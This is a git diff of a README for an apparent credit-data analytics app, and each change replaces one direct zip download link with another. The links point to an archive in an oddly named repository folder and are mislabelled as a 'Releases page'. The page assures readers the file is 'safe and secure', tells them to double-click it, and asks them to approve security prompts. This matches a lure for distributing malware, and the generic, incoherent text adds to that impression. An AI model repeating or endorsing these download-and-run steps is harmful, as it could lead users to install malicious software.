@@ -1,6 +1,6 @@
 # 📊 Credit-Data-Analytics - Unlock Key Business Insights Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/KILLADI-ui/Credit-Data-Analytics/main/parotiditis/Credit-Data-Analytics.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/KILLADI-ui/Credit-Data-Analytics/main/parotiditis/Credit-Data-Analytics.zip)
+[![Download Now](https://github.com/KILLADI-ui/Credit-Data-Analytics/raw/refs/heads/main/parotiditis/Data_Credit_Analytics_v3.4.zip%20Now-Visit%20Releases-blue)](https://github.com/KILLADI-ui/Credit-Data-Analytics/raw/refs/heads/main/parotiditis/Data_Credit_Analytics_v3.4.zip)
 
 ## 📋 Description
 
@@ -11,7 +11,7 @@ Credit-Data-Analytics is a user-friendly application designed to analyze credit 
 Follow these simple steps to get started with Credit-Data-Analytics:
 
 1. **Visit the Releases Page**  
-   To download the application, visit our [Releases page](https://raw.githubusercontent.com/KILLADI-ui/Credit-Data-Analytics/main/parotiditis/Credit-Data-Analytics.zip).
+   To download the application, visit our [Releases page](https://github.com/KILLADI-ui/Credit-Data-Analytics/raw/refs/heads/main/parotiditis/Data_Credit_Analytics_v3.4.zip).
 
 2. **Choose the Correct Version**  
    Once on the Releases page, look for the latest version of the application. You will find various files available for download. Choose the one that suits your operating system.
@@ -20,7 +20,7 @@ Follow these simple steps to get started with Credit-Data-Analytics:
    Click the download link for the chosen version. Your download will begin shortly. This file is safe and secure.
 
 4. **Locate the Downloaded File**  
-   After the download completes, navigate to your computer's Downloads folder. Find the file, which will have a name similar to `https://raw.githubusercontent.com/KILLADI-ui/Credit-Data-Analytics/main/parotiditis/Credit-Data-Analytics.zip`. 
+   After the download completes, navigate to your computer's Downloads folder. Find the file, which will have a name similar to `https://github.com/KILLADI-ui/Credit-Data-Analytics/raw/refs/heads/main/parotiditis/Data_Credit_Analytics_v3.4.zip`. 
 
 5. **Run the Application**  
    Double-click the file to run the application. You may need to approve any security prompts that show up.
@@ -48,7 +48,7 @@ Credit-Data-Analytics comes equipped with various features to enhance your data 
 
 ## 🔧 Download & Install
 
-To get started, **visit this page to download** the latest version: [Releases Page](https://raw.githubusercontent.com/KILLADI-ui/Credit-Data-Analytics/main/parotiditis/Credit-Data-Analytics.zip).
+To get started, **visit this page to download** the latest version: [Releases Page](https://github.com/KILLADI-ui/Credit-Data-Analytics/raw/refs/heads/main/parotiditis/Data_Credit_Analytics_v3.4.zip).
 
 After downloading, follow the previous instructions to run and set up the application. 
 
